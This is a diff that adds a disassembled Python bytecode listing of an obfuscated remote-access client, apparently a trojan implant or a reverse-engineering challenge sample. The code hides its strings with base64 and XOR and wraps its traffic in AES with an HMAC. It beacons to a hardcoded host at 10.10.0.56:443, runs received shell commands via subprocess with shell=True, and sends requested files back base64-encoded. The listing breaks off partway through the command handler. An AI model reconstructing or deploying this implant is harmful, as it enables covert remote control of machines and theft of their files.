@@ -1,0 +1,1097 @@
+  0           0 RESUME                   0
+
+  1           2 LOAD_CONST               0 (0)
+              4 LOAD_CONST               1 (None)
+              6 IMPORT_NAME              0 (hashlib)
+              8 STORE_NAME               0 (hashlib)
+
+  2          10 LOAD_CONST               0 (0)
+             12 LOAD_CONST               1 (None)
+             14 IMPORT_NAME              1 (base64)
+             16 STORE_NAME               1 (base64)
+
+  3          18 LOAD_CONST               0 (0)
+             20 LOAD_CONST               1 (None)
+             22 IMPORT_NAME              2 (struct)
+             24 STORE_NAME               2 (struct)
+
+  4          26 LOAD_CONST               0 (0)
+             28 LOAD_CONST               1 (None)
+             30 IMPORT_NAME              3 (socket)
+             32 STORE_NAME               3 (socket)
+
+  5          34 LOAD_CONST               0 (0)
+             36 LOAD_CONST               1 (None)
+             38 IMPORT_NAME              4 (time)
+             40 STORE_NAME               4 (time)
+
+  6          42 LOAD_CONST               0 (0)
+             44 LOAD_CONST               1 (None)
+             46 IMPORT_NAME              5 (subprocess)
+             48 STORE_NAME               5 (subprocess)
+
+  7          50 LOAD_CONST               0 (0)
+             52 LOAD_CONST               1 (None)
+             54 IMPORT_NAME              6 (sys)
+             56 STORE_NAME               6 (sys)
+
+  8          58 LOAD_CONST               0 (0)
+             60 LOAD_CONST               1 (None)
+             62 IMPORT_NAME              7 (random)
+             64 STORE_NAME               7 (random)
+
+  9          66 LOAD_CONST               0 (0)
+             68 LOAD_CONST               1 (None)
+             70 IMPORT_NAME              8 (os)
+             72 STORE_NAME               8 (os)
+
+ 10          74 LOAD_CONST               0 (0)
+             76 LOAD_CONST               2 (('AES',))
+             78 IMPORT_NAME              9 (Crypto.Cipher)
+             80 IMPORT_FROM             10 (AES)
+             82 STORE_NAME              10 (AES)
+             84 POP_TOP
+
+ 11          86 LOAD_CONST               0 (0)
+             88 LOAD_CONST               3 (('pad', 'unpad'))
+             90 IMPORT_NAME             11 (Crypto.Util.Padding)
+             92 IMPORT_FROM             12 (pad)
+             94 STORE_NAME              12 (pad)
+             96 IMPORT_FROM             13 (unpad)
+             98 STORE_NAME              13 (unpad)
+            100 POP_TOP
+
+ 12         102 LOAD_CONST               0 (0)
+            104 LOAD_CONST               4 (('get_random_bytes',))
+            106 IMPORT_NAME             14 (Crypto.Random)
+            108 IMPORT_FROM             15 (get_random_bytes)
+            110 STORE_NAME              15 (get_random_bytes)
+            112 POP_TOP
+
+ 14         114 LOAD_CONST               5 ('ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j')
+            116 STORE_NAME              16 (X7wR9t)
+
+ 16         118 LOAD_CONST               6 (<code object Fg3hY6 at 0x7f92afd89420, file "client.py", line 16>)
+            120 MAKE_FUNCTION            0
+            122 STORE_NAME              17 (Fg3hY6)
+
+ 22         124 PUSH_NULL
+            126 LOAD_NAME               17 (Fg3hY6)
+            128 LOAD_NAME               16 (X7wR9t)
+            130 CALL                     1
+            138 UNPACK_SEQUENCE          2
+            142 STORE_NAME              18 (Pq2mN5)
+            144 STORE_NAME              19 (Zk8vL4)
+
+ 24         146 LOAD_CONST               7 (<code object Jn2bM4 at 0x55e8969a5530, file "client.py", line 24>)
+            148 MAKE_FUNCTION            0
+            150 STORE_NAME              20 (Jn2bM4)
+
+ 35         152 LOAD_CONST               8 (<code object Dv5kK3 at 0x7f92afc257d0, file "client.py", line 35>)
+            154 MAKE_FUNCTION            0
+            156 STORE_NAME              21 (Dv5kK3)
+
+ 38         158 LOAD_CONST               9 (<code object Ru8wD1 at 0x55e896a058f0, file "client.py", line 38>)
+            160 MAKE_FUNCTION            0
+            162 STORE_NAME              22 (Ru8wD1)
+
+ 54         164 LOAD_CONST              10 (<code object Qw6rT1 at 0x55e896913530, file "client.py", line 54>)
+            166 MAKE_FUNCTION            0
+            168 STORE_NAME              23 (Qw6rT1)
+
+ 65         170 LOAD_CONST              11 (<code object Jl9eN3 at 0x7f92afe50cb0, file "client.py", line 65>)
+            172 MAKE_FUNCTION            0
+            174 STORE_NAME              24 (Jl9eN3)
+
+ 69         176 LOAD_CONST              12 (<code object Mx7iR4 at 0x7f92afda0ea0, file "client.py", line 69>)
+            178 MAKE_FUNCTION            0
+            180 STORE_NAME              25 (Mx7iR4)
+
+ 79         182 LOAD_CONST              13 (<code object Pn9wW1 at 0x7f92afda0ff0, file "client.py", line 79>)
+            184 MAKE_FUNCTION            0
+            186 STORE_NAME              26 (Pn9wW1)
+
+ 88         188 LOAD_CONST              14 (<code object Ve8sB7 at 0x7f92afe50df0, file "client.py", line 88>)
+            190 MAKE_FUNCTION            0
+            192 STORE_NAME              27 (Ve8sB7)
+
+ 95         194 LOAD_CONST              15 (<code object Sw1vE2 at 0x55e8968dda40, file "client.py", line 95>)
+            196 MAKE_FUNCTION            0
+            198 STORE_NAME              28 (Sw1vE2)
+
+158         200 LOAD_NAME               29 (__name__)
+            202 LOAD_CONST              16 ('__main__')
+            204 COMPARE_OP              40 (==)
+            208 POP_JUMP_IF_FALSE        8 (to 226)
+
+159         210 PUSH_NULL
+            212 LOAD_NAME               28 (Sw1vE2)
+            214 CALL                     0
+            222 POP_TOP
+            224 RETURN_CONST             1 (None)
+
+158     >>  226 RETURN_CONST             1 (None)
+
+Disassembly of <code object Fg3hY6 at 0x7f92afd89420, file "client.py", line 16>:
+ 16           0 RESUME                   0
+
+ 17           2 LOAD_GLOBAL              1 (NULL + hashlib)
+             12 LOAD_ATTR                2 (sha256)
+             32 LOAD_FAST                0 (Ab4cD2)
+             34 LOAD_ATTR                5 (NULL|self + encode)
+             54 CALL                     0
+             62 CALL                     1
+             70 LOAD_ATTR                7 (NULL|self + digest)
+             90 CALL                     0
+             98 STORE_FAST               1 (Mn7kL1)
+
+ 18         100 LOAD_GLOBAL              1 (NULL + hashlib)
+            110 LOAD_ATTR                2 (sha256)
+            130 LOAD_FAST                1 (Mn7kL1)
+            132 LOAD_CONST               1 (b'encryption')
+            134 BINARY_OP                0 (+)
+            138 CALL                     1
+            146 LOAD_ATTR                7 (NULL|self + digest)
+            166 CALL                     0
+            174 LOAD_CONST               0 (None)
+            176 LOAD_CONST               2 (32)
+            178 BINARY_SLICE
+            180 STORE_FAST               2 (Rt9wZ3)
+
+ 19         182 LOAD_GLOBAL              1 (NULL + hashlib)
+            192 LOAD_ATTR                2 (sha256)
+            212 LOAD_FAST                1 (Mn7kL1)
+            214 LOAD_CONST               3 (b'hmac')
+            216 BINARY_OP                0 (+)
+            220 CALL                     1
+            228 LOAD_ATTR                7 (NULL|self + digest)
+            248 CALL                     0
+            256 LOAD_CONST               0 (None)
+            258 LOAD_CONST               2 (32)
+            260 BINARY_SLICE
+            262 STORE_FAST               3 (Yt5xP8)
+
+ 20         264 LOAD_FAST                2 (Rt9wZ3)
+            266 LOAD_FAST                3 (Yt5xP8)
+            268 BUILD_TUPLE              2
+            270 RETURN_VALUE
+
+Disassembly of <code object Jn2bM4 at 0x55e8969a5530, file "client.py", line 24>:
+ 24           0 RESUME                   0
+
+ 25           2 NOP
+
+ 26           4 LOAD_GLOBAL              1 (NULL + len)
+             14 LOAD_FAST                0 (Lp6qR7)
+             16 CALL                     1
+             24 LOAD_CONST               1 (4)
+             26 BINARY_OP                6 (%)
+             30 POP_JUMP_IF_FALSE       23 (to 78)
+
+ 27          32 LOAD_FAST                0 (Lp6qR7)
+             34 LOAD_CONST               2 ('=')
+             36 LOAD_CONST               1 (4)
+             38 LOAD_GLOBAL              1 (NULL + len)
+             48 LOAD_FAST                0 (Lp6qR7)
+             50 CALL                     1
+             58 LOAD_CONST               1 (4)
+             60 BINARY_OP                6 (%)
+             64 BINARY_OP               10 (-)
+             68 BINARY_OP                5 (*)
+             72 BINARY_OP               13 (+=)
+             76 STORE_FAST               0 (Lp6qR7)
+
+ 28     >>   78 LOAD_GLOBAL              3 (NULL + base64)
+             88 LOAD_ATTR                4 (b64decode)
+            108 LOAD_FAST                0 (Lp6qR7)
+            110 CALL                     1
+            118 STORE_FAST               1 (Ws3tV1)
+
+ 29         120 LOAD_GLOBAL              7 (NULL + bytes)
+            130 LOAD_GLOBAL              9 (NULL + range)
+            140 LOAD_GLOBAL              1 (NULL + len)
+            150 LOAD_FAST                1 (Ws3tV1)
+            152 CALL                     1
+            160 CALL                     1
+            168 GET_ITER
+            170 LOAD_FAST_AND_CLEAR      2 (i)
+            172 SWAP                     2
+            174 BUILD_LIST               0
+            176 SWAP                     2
+        >>  178 FOR_ITER                10 (to 202)
+            182 STORE_FAST               2 (i)
+            184 LOAD_FAST                1 (Ws3tV1)
+            186 LOAD_FAST                2 (i)
+            188 BINARY_SUBSCR
+            192 LOAD_CONST               3 (85)
+            194 BINARY_OP               12 (^)
+            198 LIST_APPEND              2
+            200 JUMP_BACKWARD           12 (to 178)
+        >>  202 END_FOR
+            204 SWAP                     2
+            206 STORE_FAST               2 (i)
+            208 CALL                     1
+            216 STORE_FAST               3 (Uy4fG9)
+
+ 30         218 LOAD_GLOBAL              7 (NULL + bytes)
+            228 LOAD_GLOBAL              9 (NULL + range)
+            238 LOAD_GLOBAL              1 (NULL + len)
+            248 LOAD_FAST                3 (Uy4fG9)
+            250 CALL                     1
+            258 CALL                     1
+            266 GET_ITER
+            268 LOAD_FAST_AND_CLEAR      2 (i)
+            270 SWAP                     2
+            272 BUILD_LIST               0
+            274 SWAP                     2
+        >>  276 FOR_ITER                10 (to 300)
+            280 STORE_FAST               2 (i)
+            282 LOAD_FAST                3 (Uy4fG9)
+            284 LOAD_FAST                2 (i)
+            286 BINARY_SUBSCR
+            290 LOAD_CONST               4 (170)
+            292 BINARY_OP               12 (^)
+            296 LIST_APPEND              2
+            298 JUMP_BACKWARD           12 (to 276)
+        >>  300 END_FOR
+            302 SWAP                     2
+            304 STORE_FAST               2 (i)
+            306 CALL                     1
+            314 STORE_FAST               4 (Cx8hJ2)
+
+ 31         316 LOAD_FAST                4 (Cx8hJ2)
+            318 LOAD_ATTR               11 (NULL|self + decode)
+            338 LOAD_CONST               5 ('utf-8')
+            340 CALL                     1
+            348 RETURN_VALUE
+        >>  350 SWAP                     2
+            352 POP_TOP
+
+ 29         354 SWAP                     2
+            356 STORE_FAST               2 (i)
+            358 RERAISE                  0
+        >>  360 SWAP                     2
+            362 POP_TOP
+
+ 30         364 SWAP                     2
+            366 STORE_FAST               2 (i)
+            368 RERAISE                  0
+        >>  370 PUSH_EXC_INFO
+
+ 32         372 POP_TOP
+
+ 33         374 POP_EXCEPT
+            376 RETURN_CONST             6 ('')
+        >>  378 COPY                     3
+            380 POP_EXCEPT
+            382 RERAISE                  1
+ExceptionTable:
+  4 to 172 -> 370 [0]
+  174 to 202 -> 350 [4]
+  204 to 270 -> 370 [0]
+  272 to 300 -> 360 [4]
+  302 to 346 -> 370 [0]
+  350 to 368 -> 370 [0]
+  370 to 372 -> 378 [1] lasti
+
+Disassembly of <code object Dv5kK3 at 0x7f92afc257d0, file "client.py", line 35>:
+ 35           0 RESUME                   0
+
+ 36           2 LOAD_GLOBAL              1 (NULL + get_random_bytes)
+             12 LOAD_CONST               1 (16)
+             14 CALL                     1
+             22 RETURN_VALUE
+
+Disassembly of <code object Ru8wD1 at 0x55e896a058f0, file "client.py", line 38>:
+ 38           0 RESUME                   0
+
+ 39           2 NOP
+
+ 40           4 LOAD_GLOBAL              1 (NULL + base64)
+             14 LOAD_ATTR                2 (b64decode)
+             34 LOAD_FAST                0 (Fy2jE5)
+             36 CALL                     1
+             44 STORE_FAST               1 (Kp6tF3)
+
+ 41          46 LOAD_FAST                1 (Kp6tF3)
+             48 LOAD_CONST               0 (None)
+             50 LOAD_CONST               1 (16)
+             52 BINARY_SLICE
+             54 STORE_FAST               2 (Sr4xG7)
+
+ 42          56 LOAD_FAST                1 (Kp6tF3)
+             58 LOAD_CONST               1 (16)
+             60 LOAD_CONST               2 (-32)
+             62 BINARY_SLICE
+             64 STORE_FAST               3 (Zt9yH2)
+
+ 43          66 LOAD_FAST                1 (Kp6tF3)
+             68 LOAD_CONST               2 (-32)
+             70 LOAD_CONST               0 (None)
+             72 BINARY_SLICE
+             74 STORE_FAST               4 (Wq1zI8)
+
+ 44          76 LOAD_GLOBAL              5 (NULL + hashlib)
+             86 LOAD_ATTR                6 (new)
+            106 LOAD_CONST               3 ('sha256')
+            108 LOAD_GLOBAL              8 (Zk8vL4)
+            118 LOAD_FAST                2 (Sr4xG7)
+            120 BINARY_OP                0 (+)
+            124 LOAD_FAST                3 (Zt9yH2)
+            126 BINARY_OP                0 (+)
+            130 CALL                     2
+            138 LOAD_ATTR               11 (NULL|self + digest)
+            158 CALL                     0
+            166 STORE_FAST               5 (Ns3aJ4)
+
+ 45         168 LOAD_FAST                4 (Wq1zI8)
+            170 LOAD_FAST                5 (Ns3aJ4)
+            172 COMPARE_OP              55 (!=)
+            176 POP_JUMP_IF_FALSE       20 (to 218)
+
+ 46         178 LOAD_GLOBAL             13 (NULL + ValueError)
+            188 LOAD_GLOBAL             15 (NULL + Jn2bM4)
+            198 LOAD_CONST               4 ('t7K+vN+Jmo2WmZacnouWkJHfmZ6Wk5qb')
+            200 CALL                     1
+            208 CALL                     1
+            216 RAISE_VARARGS            1
+
+ 47     >>  218 LOAD_GLOBAL             17 (NULL + AES)
+            228 LOAD_ATTR                6 (new)
+            248 LOAD_GLOBAL             18 (Pq2mN5)
+            258 LOAD_GLOBAL             16 (AES)
+            268 LOAD_ATTR               20 (MODE_CBC)
+            288 LOAD_FAST                2 (Sr4xG7)
+            290 CALL                     3
+            298 STORE_FAST               6 (Tm5bK6)
+
+ 48         300 LOAD_GLOBAL             23 (NULL + unpad)
+            310 LOAD_FAST                6 (Tm5bK6)
+            312 LOAD_ATTR               25 (NULL|self + decrypt)
+            332 LOAD_FAST                3 (Zt9yH2)
+            334 CALL                     1
+            342 LOAD_GLOBAL             16 (AES)
+            352 LOAD_ATTR               26 (block_size)
+            372 CALL                     2
+            380 STORE_FAST               7 (Vr7cL9)
+
+ 49         382 LOAD_FAST                7 (Vr7cL9)
+            384 LOAD_ATTR               29 (NULL|self + decode)
+            404 CALL                     0
+            412 RETURN_VALUE
+        >>  414 PUSH_EXC_INFO
+
+ 50         416 LOAD_GLOBAL             30 (Exception)
+            426 CHECK_EXC_MATCH
+            428 POP_JUMP_IF_FALSE       10 (to 450)
+            430 STORE_FAST               8 (Dg8dM0)
+
+ 51         432 POP_EXCEPT
+            434 LOAD_CONST               0 (None)
+            436 STORE_FAST               8 (Dg8dM0)
+            438 DELETE_FAST              8 (Dg8dM0)
+            440 RETURN_CONST             0 (None)
+            442 LOAD_CONST               0 (None)
+            444 STORE_FAST               8 (Dg8dM0)
+            446 DELETE_FAST              8 (Dg8dM0)
+            448 RERAISE                  1
+
+ 50     >>  450 RERAISE                  0
+        >>  452 COPY                     3
+            454 POP_EXCEPT
+            456 RERAISE                  1
+ExceptionTable:
+  4 to 410 -> 414 [0]
+  414 to 430 -> 452 [1] lasti
+  442 to 450 -> 452 [1] lasti
+
+Disassembly of <code object Qw6rT1 at 0x55e896913530, file "client.py", line 54>:
+ 54           0 RESUME                   0
+
+ 55           2 LOAD_GLOBAL              1 (NULL + isinstance)
+             12 LOAD_FAST                0 (Bn9mS4)
+             14 LOAD_GLOBAL              2 (bytes)
+             24 CALL                     2
+             32 POP_JUMP_IF_FALSE        3 (to 40)
+
+ 56          34 LOAD_FAST                0 (Bn9mS4)
+             36 STORE_FAST               1 (Hj3lA7)
+             38 JUMP_FORWARD            16 (to 72)
+
+ 58     >>   40 LOAD_FAST                0 (Bn9mS4)
+             42 LOAD_ATTR                5 (NULL|self + encode)
+             62 CALL                     0
+             70 STORE_FAST               1 (Hj3lA7)
+
+ 59     >>   72 LOAD_GLOBAL              7 (NULL + Dv5kK3)
+             82 CALL                     0
+             90 STORE_FAST               2 (Vc5xZ8)
+
+ 60          92 LOAD_GLOBAL              9 (NULL + AES)
+            102 LOAD_ATTR               10 (new)
+            122 LOAD_GLOBAL             12 (Pq2mN5)
+            132 LOAD_GLOBAL              8 (AES)
+            142 LOAD_ATTR               14 (MODE_CBC)
+            162 LOAD_FAST                2 (Vc5xZ8)
+            164 CALL                     3
+            172 STORE_FAST               3 (Pl1oN2)
+
+ 61         174 LOAD_FAST                3 (Pl1oN2)
+            176 LOAD_ATTR               17 (NULL|self + encrypt)
+            196 LOAD_GLOBAL             19 (NULL + pad)
+            206 LOAD_FAST                1 (Hj3lA7)
+            208 LOAD_GLOBAL              8 (AES)
+            218 LOAD_ATTR               20 (block_size)
+            238 CALL                     2
+            246 CALL                     1
+            254 STORE_FAST               4 (Mg7uB6)
+
+ 62         256 LOAD_GLOBAL             23 (NULL + hashlib)
+            266 LOAD_ATTR               10 (new)
+            286 LOAD_CONST               1 ('sha256')
+            288 LOAD_GLOBAL             24 (Zk8vL4)
+            298 LOAD_FAST                2 (Vc5xZ8)
+            300 BINARY_OP                0 (+)
+            304 LOAD_FAST                4 (Mg7uB6)
+            306 BINARY_OP                0 (+)
+            310 CALL                     2
+            318 LOAD_ATTR               27 (NULL|self + digest)
+            338 CALL                     0
+            346 STORE_FAST               5 (Lt4vC9)
+
+ 63         348 LOAD_GLOBAL             29 (NULL + base64)
+            358 LOAD_ATTR               30 (b64encode)
+            378 LOAD_FAST                2 (Vc5xZ8)
+            380 LOAD_FAST                4 (Mg7uB6)
+            382 BINARY_OP                0 (+)
+            386 LOAD_FAST                5 (Lt4vC9)
+            388 BINARY_OP                0 (+)
+            392 CALL                     1
+            400 RETURN_VALUE
+
+Disassembly of <code object Jl9eN3 at 0x7f92afe50cb0, file "client.py", line 65>:
+ 65           0 RESUME                   0
+
+ 66           2 LOAD_GLOBAL              1 (NULL + Qw6rT1)
+             12 LOAD_FAST                1 (Hw6gP5)
+             14 CALL                     1
+             22 STORE_FAST               2 (Rv2hQ1)
+
+ 67          24 LOAD_FAST                0 (Bk4fO2)
+             26 LOAD_ATTR                3 (NULL|self + sendall)
+             46 LOAD_GLOBAL              5 (NULL + struct)
+             56 LOAD_ATTR                6 (pack)
+             76 LOAD_CONST               1 ('>I')
+             78 LOAD_GLOBAL              9 (NULL + len)
+             88 LOAD_FAST                2 (Rv2hQ1)
+             90 CALL                     1
+             98 CALL                     2
+            106 LOAD_FAST                2 (Rv2hQ1)
+            108 BINARY_OP                0 (+)
+            112 CALL                     1
+            120 POP_TOP
+            122 RETURN_CONST             0 (None)
+
+Disassembly of <code object Mx7iR4 at 0x7f92afda0ea0, file "client.py", line 69>:
+ 69           0 RESUME                   0
+
+ 70           2 LOAD_GLOBAL              1 (NULL + Pn9wW1)
+             12 LOAD_FAST                0 (Gt3jS8)
+             14 LOAD_CONST               1 (4)
+             16 CALL                     2
+             24 STORE_FAST               1 (Ln1kT9)
+
+ 71          26 LOAD_FAST                1 (Ln1kT9)
+             28 POP_JUMP_IF_TRUE         1 (to 32)
+
+ 72          30 RETURN_CONST             0 (None)
+
+ 73     >>   32 LOAD_GLOBAL              3 (NULL + struct)
+             42 LOAD_ATTR                4 (unpack)
+             62 LOAD_CONST               2 ('>I')
+             64 LOAD_FAST                1 (Ln1kT9)
+             66 CALL                     2
+             74 LOAD_CONST               3 (0)
+             76 BINARY_SUBSCR
+             80 STORE_FAST               2 (Yb5lU6)
+
+ 74          82 LOAD_GLOBAL              1 (NULL + Pn9wW1)
+             92 LOAD_FAST                0 (Gt3jS8)
+             94 LOAD_FAST                2 (Yb5lU6)
+             96 CALL                     2
+            104 STORE_FAST               3 (Cq8mV2)
+
+ 75         106 LOAD_FAST                3 (Cq8mV2)
+            108 POP_JUMP_IF_TRUE         1 (to 112)
+
+ 76         110 RETURN_CONST             0 (None)
+
+ 77     >>  112 LOAD_GLOBAL              7 (NULL + Ru8wD1)
+            122 LOAD_FAST                3 (Cq8mV2)
+            124 CALL                     1
+            132 RETURN_VALUE
+
+Disassembly of <code object Pn9wW1 at 0x7f92afda0ff0, file "client.py", line 79>:
+ 79           0 RESUME                   0
+
+ 80           2 LOAD_CONST               1 (b'')
+              4 STORE_FAST               2 (Dr7qZ0)
+
+ 81           6 LOAD_GLOBAL              1 (NULL + len)
+             16 LOAD_FAST                2 (Dr7qZ0)
+             18 CALL                     1
+             26 LOAD_FAST                1 (Za6pY3)
+             28 COMPARE_OP               2 (<)
+             32 POP_JUMP_IF_FALSE       52 (to 138)
+
+ 82     >>   34 LOAD_FAST                0 (Uo4oX5)
+             36 LOAD_ATTR                3 (NULL|self + recv)
+             56 LOAD_FAST                1 (Za6pY3)
+             58 LOAD_GLOBAL              1 (NULL + len)
+             68 LOAD_FAST                2 (Dr7qZ0)
+             70 CALL                     1
+             78 BINARY_OP               10 (-)
+             82 CALL                     1
+             90 STORE_FAST               3 (Fw2rA4)
+
+ 83          92 LOAD_FAST                3 (Fw2rA4)
+             94 POP_JUMP_IF_TRUE         1 (to 98)
+
+ 84          96 RETURN_CONST             0 (None)
+
+ 85     >>   98 LOAD_FAST                2 (Dr7qZ0)
+            100 LOAD_FAST                3 (Fw2rA4)
+            102 BINARY_OP               13 (+=)
+            106 STORE_FAST               2 (Dr7qZ0)
+
+ 81         108 LOAD_GLOBAL              1 (NULL + len)
+            118 LOAD_FAST                2 (Dr7qZ0)
+            120 CALL                     1
+            128 LOAD_FAST                1 (Za6pY3)
+            130 COMPARE_OP               2 (<)
+            134 POP_JUMP_IF_FALSE        1 (to 138)
+            136 JUMP_BACKWARD           52 (to 34)
+
+ 86     >>  138 LOAD_FAST                2 (Dr7qZ0)
+            140 RETURN_VALUE
+
+Disassembly of <code object Ve8sB7 at 0x7f92afe50df0, file "client.py", line 88>:
+ 88           0 RESUME                   0
+
+ 89           2 NOP
+
+ 90           4 LOAD_GLOBAL              1 (NULL + subprocess)
+             14 LOAD_ATTR                2 (check_output)
+             34 LOAD_FAST                0 (Hj5tC1)
+             36 LOAD_CONST               1 (True)
+             38 LOAD_GLOBAL              0 (subprocess)
+             48 LOAD_ATTR                4 (STDOUT)
+             68 LOAD_CONST               2 (10)
+             70 KW_NAMES                 3 (('shell', 'stderr', 'timeout'))
+             72 CALL                     4
+             80 STORE_FAST               1 (Kd3uD9)
+
+ 91          82 LOAD_FAST                1 (Kd3uD9)
+             84 LOAD_ATTR                7 (NULL|self + decode)
+            104 CALL                     0
+            112 RETURN_VALUE
+        >>  114 PUSH_EXC_INFO
+
+ 92         116 POP_TOP
+
+ 93         118 POP_EXCEPT
+            120 RETURN_CONST             4 ('Failed')
+        >>  122 COPY                     3
+            124 POP_EXCEPT
+            126 RERAISE                  1
+ExceptionTable:
+  4 to 110 -> 114 [0]
+  114 to 116 -> 122 [1] lasti
+
+Disassembly of <code object Sw1vE2 at 0x55e8968dda40, file "client.py", line 95>:
+ 95           0 RESUME                   0
+
+ 96           2 LOAD_CONST               1 ('10.10.0.56')
+              4 STORE_FAST               0 (Mn9wF6)
+
+ 97           6 LOAD_CONST               2 (443)
+              8 STORE_FAST               1 (Gt4xG3)
+
+ 98          10 LOAD_CONST               3 (30)
+             12 STORE_FAST               2 (Rz2zI1)
+
+100          14 NOP
+
+101     >>   16 NOP
+
+102          18 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+             28 LOAD_CONST               5 ('vqy3oLyztqA=')
+             30 CALL                     1
+             38 LOAD_CONST               6 ('')
+             40 LOAD_ATTR                3 (NULL|self + join)
+             60 LOAD_GLOBAL              5 (NULL + range)
+             70 LOAD_CONST               7 (20)
+             72 CALL                     1
+             80 GET_ITER
+             82 LOAD_FAST_AND_CLEAR      3 (_)
+             84 SWAP                     2
+             86 BUILD_LIST               0
+             88 SWAP                     2
+        >>   90 FOR_ITER                33 (to 160)
+             94 STORE_FAST               3 (_)
+             96 LOAD_GLOBAL              7 (NULL + chr)
+            106 LOAD_GLOBAL              9 (NULL + random)
+            116 LOAD_ATTR               10 (randint)
+            136 LOAD_CONST               8 (97)
+            138 LOAD_CONST               9 (122)
+            140 CALL                     2
+            148 CALL                     1
+            156 LIST_APPEND              2
+            158 JUMP_BACKWARD           35 (to 90)
+        >>  160 END_FOR
+            162 SWAP                     2
+            164 STORE_FAST               3 (_)
+            166 CALL                     1
+            174 BINARY_OP                0 (+)
+            178 STORE_FAST               4 (Lp7yH8)
+
+104         180 LOAD_GLOBAL             13 (NULL + socket)
+            190 LOAD_ATTR               12 (socket)
+            210 LOAD_GLOBAL             12 (socket)
+            220 LOAD_ATTR               14 (AF_INET)
+            240 LOAD_GLOBAL             12 (socket)
+            250 LOAD_ATTR               16 (SOCK_STREAM)
+            270 CALL                     2
+            278 STORE_FAST               5 (Jx6aS4)
+
+105         280 LOAD_FAST                5 (Jx6aS4)
+            282 LOAD_ATTR               19 (NULL|self + connect)
+            302 LOAD_FAST                0 (Mn9wF6)
+            304 LOAD_FAST                1 (Gt4xG3)
+            306 BUILD_TUPLE              2
+            308 CALL                     1
+            316 POP_TOP
+
+107         318 LOAD_GLOBAL             21 (NULL + Jl9eN3)
+            328 LOAD_FAST                5 (Jx6aS4)
+            330 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+            340 LOAD_CONST              10 ('vbq+vLCx34TPgt+EzoI=')
+            342 CALL                     1
+            350 LOAD_ATTR               23 (NULL|self + format)
+            370 LOAD_FAST                4 (Lp7yH8)
+            372 LOAD_GLOBAL             25 (NULL + time)
+            382 LOAD_ATTR               24 (time)
+            402 CALL                     0
+            410 CALL                     2
+            418 CALL                     2
+            426 POP_TOP
+
+109         428 LOAD_GLOBAL             27 (NULL + Mx7iR4)
+            438 LOAD_FAST                5 (Jx6aS4)
+            440 CALL                     1
+            448 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+            458 LOAD_CONST              11 ('vLe+s7O6sbi6')
+            460 CALL                     1
+            468 COMPARE_OP              55 (!=)
+            472 POP_JUMP_IF_FALSE       19 (to 512)
+
+110         474 NOP
+
+152         476 NOP
+
+153         478 LOAD_FAST                5 (Jx6aS4)
+            480 LOAD_ATTR               29 (NULL|self + close)
+            500 CALL                     0
+            508 POP_TOP
+            510 RETURN_CONST             0 (None)
+
+111     >>  512 LOAD_GLOBAL             21 (NULL + Jl9eN3)
+            522 LOAD_FAST                5 (Jx6aS4)
+            524 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+            534 LOAD_CONST              12 ('vLe+s7O6sbi6oK26rK+wsay6')
+            536 CALL                     1
+            544 CALL                     2
+            552 POP_TOP
+
+113         554 NOP
+
+114     >>  556 LOAD_GLOBAL             27 (NULL + Mx7iR4)
+            566 LOAD_FAST                5 (Jx6aS4)
+            568 CALL                     1
+            576 STORE_FAST               6 (Tb8bJ5)
+
+115         578 LOAD_FAST                6 (Tb8bJ5)
+            580 POP_JUMP_IF_TRUE         2 (to 586)
+
+116         582 EXTENDED_ARG             2
+            584 JUMP_FORWARD           680 (to 1946)
+
+118     >>  586 LOAD_FAST                6 (Tb8bJ5)
+            588 LOAD_ATTR               31 (NULL|self + startswith)
+            608 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+            618 LOAD_CONST              13 ('u6ixs6C5trO63w==')
+            620 CALL                     1
+            628 CALL                     1
+            636 POP_JUMP_IF_FALSE      222 (to 1082)
+
+119         638 LOAD_FAST                6 (Tb8bJ5)
+            640 LOAD_ATTR               33 (NULL|self + split)
+            660 LOAD_CONST              14 (2)
+            662 KW_NAMES                15 (('maxsplit',))
+            664 CALL                     1
+            672 STORE_FAST               7 (Yq3cK7)
+
+120         674 LOAD_GLOBAL             35 (NULL + len)
+            684 LOAD_FAST                7 (Yq3cK7)
+            686 CALL                     1
+            694 LOAD_CONST              14 (2)
+            696 COMPARE_OP              92 (>=)
+            700 EXTENDED_ARG             2
+            702 POP_JUMP_IF_FALSE      619 (to 1942)
+
+121         704 LOAD_FAST                7 (Yq3cK7)
+            706 LOAD_CONST              16 (1)
+            708 BINARY_SUBSCR
+            712 STORE_FAST               8 (Xk1dL2)
+
+122         714 LOAD_GLOBAL             36 (os)
+            724 LOAD_ATTR               38 (path)
+            744 LOAD_ATTR               41 (NULL|self + exists)
+            764 LOAD_FAST                8 (Xk1dL2)
+            766 CALL                     1
+            774 POP_JUMP_IF_FALSE      119 (to 1014)
+
+123         776 LOAD_GLOBAL             43 (NULL + open)
+            786 LOAD_FAST                8 (Xk1dL2)
+            788 LOAD_CONST              17 ('rb')
+            790 CALL                     2
+            798 BEFORE_WITH
+            800 STORE_FAST               9 (f)
+
+124         802 LOAD_FAST                9 (f)
+            804 LOAD_ATTR               45 (NULL|self + read)
+            824 CALL                     0
+            832 STORE_FAST              10 (Vn5eM9)
+
+123         834 LOAD_CONST               0 (None)
+            836 LOAD_CONST               0 (None)
+            838 LOAD_CONST               0 (None)
+            840 CALL                     2
+            848 POP_TOP
+
+125     >>  850 LOAD_GLOBAL             21 (NULL + Jl9eN3)
+            860 LOAD_FAST                5 (Jx6aS4)
+            862 LOAD_GLOBAL              1 (NULL + Jn2bM4)
+            872 LOAD_CONST              18 ('u6ixs6C7vqu+34TPgg==')
+            874 CALL                     1
+            882 LOAD_ATTR               23 (NULL|self + format)
+            902 LOAD_GLOBAL             47 (NULL + base64)
+            912 LOAD_ATTR               48 (b64encode)
+            932 LOAD_FAST_CHECK         10 (Vn5eM9)
+            934 CALL                     1
+            942 LOAD_ATTR               51 (NULL|self + decode)
+            962 CALL                     0
+            970 CALL                     1
+            978 CALL                     2
+            986 POP_TOP
+
+126         988 LOAD_GLOBAL             27 (NULL + Mx7iR4)
+            998 LOAD_FAST                5 (Jx6aS4)
+           1000 CALL                     1
+           1008 POP_TOP
+           1010 EXTENDED_ARG             1
+           1012 JUMP_FORWARD           464 (to 1942)
+
+128     >> 1014 LOAD_GLOBAL             21 (NULL + Jl9eN3)
+           1024 LOAD_FAST                5 (Jx6aS4)
